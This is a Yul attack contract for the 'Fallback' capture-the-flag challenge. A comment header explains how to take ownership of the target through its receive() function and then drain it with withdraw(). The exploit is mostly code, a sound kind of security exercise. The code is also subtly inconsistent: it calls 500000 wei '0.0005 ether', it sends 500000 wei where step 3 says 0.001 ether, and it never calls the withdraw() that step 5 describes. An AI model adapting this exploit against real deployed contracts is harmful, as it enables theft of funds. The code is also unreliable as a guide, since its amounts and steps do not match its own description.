/**
 * [Attack contract for Fallback challenge]
 * 1. The `receive` function is designed to receive plain transfers (transfer, send, call("")). 
 * 2. To satisfy the condition `contributions[msg.sender] > 0`, we first call `contribute()` with a transfer amount less than 0.001 ether. 
 * 3. Then, we perform a plain transfer operation: `token.call{value: 0.001 ether}("")`. 
 * 4.This fulfills the execution condition, leading to the execution of `owner = msg.sender`, thereby granting us ownership. 
 * 5. With ownership secured, we execute `withdraw()`, withdrawing the entire balance of the contract, effectively emptying its funds.
 * 
 * Note: The target contract address can be determined in two ways:
 * - Constructor initialization: Store the address in storage during deployment
 * - Function parameter: Pass the address as a parameter when calling attack()
 * We chose the function parameter approach for greater flexibility, allowing the contract to attack different targets.
 */
object "Fallback" {
  code {
    // Simple deployment without constructor arguments
    datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
    return(0, datasize("Runtime"))
  }

  object "Runtime" {
    code {
      // Check if we have calldata
      if gt(calldatasize(), 0) {
        let selector := shr(224, calldataload(0))

        switch selector
        // attack(address) == 0xd018db3e
        case 0xd018db3e {
          
          // Get target address from calldata (first parameter after selector)
          let target := calldataload(0x04)
          
          // Prepare calldata for contribute() - selector needs to be left-aligned
          mstore(0x00, shl(224, 0xd7bb99ba))
          
          // 1. call fallback.contribute() to send 0.0005 ether (500000 wei)
          let res1 := call(gas(), target, 500000, 0x00, 0x04, 0x00, 0x00)
          
          if eq(res1, 1) {
            // 2. call to send value to trigger `receive()` function of fallback
             let res2 := call(gas(), target, 500000, 0x00, 0x00, 0x00, 0x00)
             // store the result in memory
              mstore(0x00, res2)
             if eq(res2, 1){
              // `success` => 0x53756363657373
              log1(0x00, 0x20, 0x53756363657373)
              // Return true
              mstore(0x00, 0x01)
              return(0x00, 0x20)
             }
          }
          // Return false if failed
          mstore(0x00, 0x00)
          return(0x00, 0x20)
        }
        default {
          // Unknown function
          revert(0, 0)
        }
      }
      // fallback/receive to accept ETH (when calldatasize is 0)
      stop()
    }
  }
}